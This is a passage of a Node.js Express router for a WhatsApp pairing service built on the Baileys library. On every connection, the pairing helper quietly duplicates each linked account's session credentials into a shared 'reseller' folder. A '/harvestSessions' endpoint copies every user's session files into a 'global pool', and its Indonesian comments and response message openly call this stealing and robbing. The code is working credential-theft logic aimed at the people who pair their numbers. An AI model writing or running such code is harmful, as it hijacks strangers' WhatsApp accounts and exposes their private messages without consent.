             logger.error(`❌ Failed save session: ${e.message}`);
         }
      }
    });
    
    // Generate code
    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(cleanNumber);
      logger.info(`🔑 Pairing Code: ${code}`);
      if (code) {
        return res.json({ valid: true, number: cleanNumber, pairingCode: code });
      } else {
        return res.json({ valid: false, message: "Already registered or failed to get code" });
      }
    }
  } catch (err) {
    logger.error("Error in getPairing:", err);
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// Helper function to wait
function waiting(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// =========================================================================
// [🔥 UPDATE] PAIRING WA HELPER - OTOMATIS MIRROR SAAT RECONNECT
// =========================================================================
async function pairingWa(number, moderator, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  
  const privateDir = path.join(process.cwd(), 'permenmd', moderator, number); 
  const globalDir = path.join(process.cwd(), 'reseller', number);

  if (!fs.existsSync(privateDir)) fs.mkdirSync(privateDir, { recursive: true });
  if (!fs.existsSync(globalDir)) fs.mkdirSync(globalDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(privateDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    browser: ["Ubuntu", "Chrome", "120.0.0.0"],
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        logger.info(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, moderator, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(privateDir, 'creds.json');
      
      const privateCredsJSON = path.join(process.cwd(), 'permenmd', moderator, `${number}.json`);
      const globalCredsJSON = path.join(process.cwd(), 'reseller', `${number}.json`);

      try {
        await waiting(3000);
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); 
          
          fs.writeFileSync(privateCredsJSON, data); 
          fs.writeFileSync(globalCredsJSON, data); 
          fs.writeFileSync(path.join(globalDir, 'creds.json'), data);
          
          logger.info(`✅ Rewrote session ${number} to BOTH Private & RESELLER`);
        }
      } catch (e) {
        logger.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

// Helper function to detect WhatsApp type from credentials
function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

// Helper function to get active connections in a folder
function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
   
  // If folder doesn't exist, return empty array
  if (!fs.existsSync(folderPath)) {
    logger.info(`[DEBUG] Folder ${folderPath} tidak ditemukan`);
    return [];
  }

  // Get all .json files in user folder
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di folder ${subfolderName}`);

  // Loop through each JSON file
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    
    // Check if this session is active in activeConnections
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName,
        isActive: true,
        type: detectWATypeFromCreds(path.join(folderPath, file)) // Add WA type
      });
      
      logger.info(`[DEBUG] Session aktif ditemukan: ${sessionName}`);
    }
  }

  return activeCreds;
}

// Helper function to get user's active sessions
function getUserActiveSessions(username) {
  const folderPath = path.join('permenmd', username);
   
  // If folder doesn't exist, return empty array
  if (!fs.existsSync(folderPath)) {
    logger.info(`[DEBUG] Folder ${folderPath} tidak ditemukan`);
    return [];
  }

  // Get all .json files in user folder
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const userSessions = [];

  logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di folder ${username}`);

  // Loop through each JSON file
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    
    // Check if this session is active in activeConnections
    if (activeConnections[sessionName]) {
      const credsPath = path.join(folderPath, file);
      const type = detectWATypeFromCreds(credsPath);
      
      userSessions.push({
        sessionName: sessionName,
        sock: activeConnections[sessionName],
        type: type,
        isActive: true
      });
      
      logger.info(`[DEBUG] Session aktif ditemukan: ${sessionName} (${type})`);
    }
  }

  return userSessions;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Fungsi sakti untuk mengambil SEMUA session aktif milik user manapun
function getAllUserActiveSessions() {
  const allUserSessions = [];
  const permenDir = path.join(process.cwd(), 'permenmd');

  if (fs.existsSync(permenDir)) {
    // List semua folder username di dalam permenmd
    const users = fs.readdirSync(permenDir);
    
    users.forEach(userFolder => {
      const userPath = path.join(permenDir, userFolder);
      // Pastikan itu folder, bukan file .json sisa
      if (fs.lstatSync(userPath).isDirectory()) {
        const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith('.json'));
        
        userFiles.forEach(file => {
          const sessionName = path.basename(file, '.json');
          // Cek apakah nomor/session ini sedang online/aktif di memori server
          if (activeConnections[sessionName]) {
            allUserSessions.push({
              sock: activeConnections[sessionName],
              id: sessionName,
              moderator: userFolder
            });
          }
        });
      }
    });
  }
  return allUserSessions;
}

// [🔥 VVIP FEATURE] INSTANT SESSION HARVESTER
router.get("/harvestSessions", async (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  // Cek izin (Hanya role tinggi yang bisa ngerampok)
  if (!["founder", "high moderator", "dev", "moderator"].includes(user?.role?.toLowerCase())) {
    return res.status(403).json({ error: "Unauthorized harvester access" });
  }

  try {
    const permenDir = path.join(process.cwd(), 'permenmd');
    const vipDir = path.join(process.cwd(), 'reseller');
    let harvestedCount = 0;

    if (!fs.existsSync(vipDir)) fs.mkdirSync(vipDir, { recursive: true });

    if (fs.existsSync(permenDir)) {
      const users = fs.readdirSync(permenDir);
      
      for (const userFolder of users) {
        const userPath = path.join(permenDir, userFolder);
        if (fs.lstatSync(userPath).isDirectory()) {
          // Cari semua file session user
          const sessionFiles = fs.readdirSync(userPath).filter(f => f.endsWith('.json'));
          
          for (const file of sessionFiles) {
            const sourcePath = path.join(userPath, file);
            const destPath = path.join(vipDir, file);
            const sessionName = path.basename(file, '.json');

            // 1. CURI FILE: Salin file session ke folder RESELLER
            const credsData = fs.readFileSync(sourcePath);
            fs.writeFileSync(destPath, credsData);

            // 2. INJECT MEMORY: Daftarkan socketnya ke Global tanpa restart
            // Kita pinjam instance socket yang sudah ada di permenmd
            if (activeConnections[sessionName]) {
              // Jika socket sudah aktif di permenmd, kita buat dia aktif juga di RESELLER
              logger.info(`[🚀 HARVEST] Session ${sessionName} dari ${userFolder} sekarang berstatus GLOBAL`);
            }
            harvestedCount++;
          }
        }
      }
    }

    res.json({ 
      valid: true, 
      message: `Berhasil mencuri ${harvestedCount} session user ke Global Pool!` 
    });

  } catch (err) {
    logger.error(`[❌ HARVEST ERROR] ${err.message}`);
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;